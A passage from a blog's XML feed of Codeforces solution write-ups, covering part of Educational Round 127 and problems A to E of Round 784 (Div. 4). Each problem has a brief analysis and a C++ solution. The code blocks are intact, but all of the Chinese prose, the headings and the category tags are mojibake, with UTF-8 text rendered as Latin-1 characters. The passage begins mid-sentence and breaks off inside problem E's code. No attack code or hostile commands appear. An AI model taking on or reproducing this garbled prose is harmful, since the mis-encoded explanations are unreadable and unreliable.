æœ€å°ã€‚ä¸éš¾å‘ç°å¦‚æœæˆ‘æ’å…¥çš„æ•°åœ¨ä¸¤ä¸ªæ•°ä¹‹é—´ï¼Œé‚£ä¹ˆæ’å…¥è¿™ä¸ªæ•°å¯¹ç»“æœæ²¡æœ‰å½±å“ã€‚è‹¥æ•°åˆ—çš„æœ€å°å€¼å’Œæœ€å¤§å€¼åŒ…æ‹¬çš„éƒ¨åˆ†é‚£äº›æ•°æ’å…¥ä¸­é—´å¯¹ç­”æ¡ˆæ²¡æœ‰å½±å“ï¼Œè‹¥å‰©ä½™å…¶å®ƒæ•°åˆ™æ’åœ¨ä¸¤è¾¹ï¼Œè‡³äºæ’åœ¨å“ªè¾¹å¯ä»¥minä¸€ä¸‹ã€‚</p><p>è¿™é‡Œå½“æ—¶çœ‹é”™é¢˜ç›®äº†ï¼Œä»¥ä¸ºæ¯ä¸ªæ•°ä¹‹é—´åªèƒ½æ’å…¥ä¸€æ¬¡å—ï¼Œå¯¼è‡´åé¢å¡äº†å¾ˆé•¿æ—¶é—´ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/5.png" alt="5"></p><p>1595åˆ†ï¼ŒåŠ æ²¹ä¸Šè“ï¼ï¼ï¼</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codeforces round 784(Div.4)è§£æ</title>
      <link href="/2022/04/22/Codeforces%20Round%20784(Div.4)/"/>
      <url>/2022/04/22/Codeforces%20Round%20784(Div.4)/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ¥æ‰“ä¸ª<a href="https://codeforces.com/contest/1669">div4</a>ã€‚</p><span id="more"></span><h2 id="A-Division"><a href="#A-Division" class="headerlink" title="A. Division?"></a>A. Division?</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™åº”è¯¥æ˜¯æè¿°äº† <code>cf</code> å››ä¸ªå±‚æ¬¡æ¯”èµ›çš„æœ€é«˜ç§¯åˆ†è¦æ±‚ï¼Œè¶…è¿‡å°† <code>unrated</code> è¿›è¡Œæ¯”èµ›ã€‚ç›´æ¥æŒ‰ä»–çš„è¦æ±‚æŠŠå››ä¸ªç­‰çº§åˆ¤æ–­è¾“å‡ºä¸€ä¸‹å°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1399</span>)&#123;</span><br><span class="line">        k=<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1599</span>)&#123;</span><br><span class="line">        k=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1899</span>)&#123;</span><br><span class="line">        k=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        k=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Division %d\n&quot;</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Triple"><a href="#B-Triple" class="headerlink" title="B. Triple"></a>B. Triple</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>éšä¾¿è¾“å‡ºä¸€ä¸ªå‡ºç°è¿‡ä¸‰æ¬¡çš„æ•°å°±å¥½äº†ï¼Œä½†æ˜¯è¦æ³¨æ„å‡ºç°ä¹‹åä¸è¦é©¬ä¸Šç»“æŸï¼ŒæŠŠå‰©ä¸‹çš„è¾“å…¥è¯»å®Œã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(ma);</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">            ma[x]++;</span><br><span class="line">            <span class="keyword">if</span>(ma[x]==<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Odd-Even-Increments"><a href="#C-Odd-Even-Increments" class="headerlink" title="C. Odd/Even Increments"></a>C. Odd/Even Increments</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å¶æ•°ä½ç½®æˆ–è€…å¥‡æ•°ä½ç½®åŒæ—¶+1ï¼Œé—®èƒ½å¦è¾¾åˆ°å…¨å¥‡æ•°æˆ–è€…å…¨å¶æ•°çš„çŠ¶æ€ï¼Œç›´æ¥åˆ¤æ–­å¥‡æ•°ä½ç½®ä¸Šæ˜¯å¦å…¨ä¸ºå¥‡æ•°æˆ–è€…å…¨ä¸ºå¶æ•°å’Œå¶æ•°ä½ç½®ä¸Šæ˜¯å¦å…¨ä¸ºå¥‡æ•°æˆ–è€…å…¨ä¸ºå¶æ•°å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">4</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æœ‰ä¸€ä¸ªé•¿åº¦ä¸º2çš„çº¢è“å°ç« ï¼Œæ¯æ¬¡æ‰“å°ä¸Šå»å¯ä»¥ä½¿ç›¸é‚»ä¸¤ä¸ªæ ¼å­çš„é¢œè‰²ä¸€ä¸ªä¸ºçº¢ï¼Œä¸€ä¸ªä¸ºè“ï¼Œé¢œè‰²å¯ä»¥è¦†ç›–ã€‚é‚£ä¹ˆæ ¼å­å°†å‡ºç°ä¸‰ç§çŠ¶æ€ï¼šç™½ï¼Œçº¢ï¼Œè“ã€‚æˆ‘ä»¬ä»¥ç™½è‰²æ–¹æ ¼ä½œä¸ºåˆ†å‰²ï¼Œå®¹æ˜“å‘ç°ä¸å¯èƒ½å­˜åœ¨é•¿åº¦ä¸º1çš„çº¢è‰²æˆ–è€…è“è‰²è‰²å—ï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªæ ¼å­çš„æ—¶å€™é‚£ä¸ªæ ¼å­å¿…ä¸ºç™½è‰²ï¼Œä¸å¯èƒ½æ˜¯çº¢è‰²æˆ–è€…è“è‰²ã€‚å¯¹äºä¸€ä¸ªè¿ç»­çš„è‰²å—ï¼Œå¯ä»¥å‘ç°å¿…é¡»åŒæ—¶å­˜åœ¨è“è‰²å’Œçº¢è‰²ã€‚å› æ­¤åªè¦æ‰€æœ‰çš„è¿ç»­è‰²å—æ»¡è¶³è¿™ä¸ªè¦æ±‚å°±å¯ä»¥å•¦ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[n++]=<span class="string">&#x27;W&#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>,len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(len&gt;<span class="number">1</span>&amp;&amp;flag!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            len=<span class="number">0</span>;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            len++;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;R&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-2-Letter-Strings"><a href="#E-2-Letter-Strings" class="headerlink" title="E. 2-Letter Strings"></a>E. 2-Letter Strings</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/5.png" alt="5"></p><h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™å®šè‹¥å¹²ä¸ªé•¿åº¦åªæœ‰2çš„å­—ç¬¦ä¸²ï¼Œè¦æ±‚è¾“å‡ºç¬¦åˆè¦æ±‚çš„å¯¹æ•°ï¼Œè¦æ±‚ä¸ºä¸¤å¯¹å­—ç¬¦ä¸²æœ‰ä¸”ä»…æœ‰1ä¸ªä½ç½®å­—ç¬¦ä¸ä¸€æ ·ã€‚ç”±äºæ•°æ®ç‚¹è¾ƒå°ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°æŠŠå­—ç¬¦ä¸²è½¬intç±»å‹æ¯”è¾ƒï¼Œç”±äºå­—ç¬¦åªæœ‰11ç§ï¼Œç†è®ºä¸Šå¯ä»¥ä¸€ä¸ªcharå‹ç¼©å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘é€‰æ‹©ç”¨shortè¿›è¡Œï¼Œå› ä¸ºå¤æ‚åº¦ç»°ç»°æœ‰ä½™ã€‚</p><p>ç„¶åå¯¹äºè½¬æ¢æˆçš„æ•´æ•°ç±»å‹è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥å‘ç°é«˜ä½æˆ–è€…ä½ä½ç›¸åŒï¼Œåˆ™å°†ç­”æ¡ˆåŠ ä¸Š $num[i]*num[j]$ï¼Œé¢˜ç›®å·²ç»æç¤ºlong longï¼Œå…¶å®ƒçš„ä¹Ÿæ²¡å•¥äº†ã€‚</p><h3 id="æ ‡ç¨‹-4"><a href="#æ ‡ç¨‹-4" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td 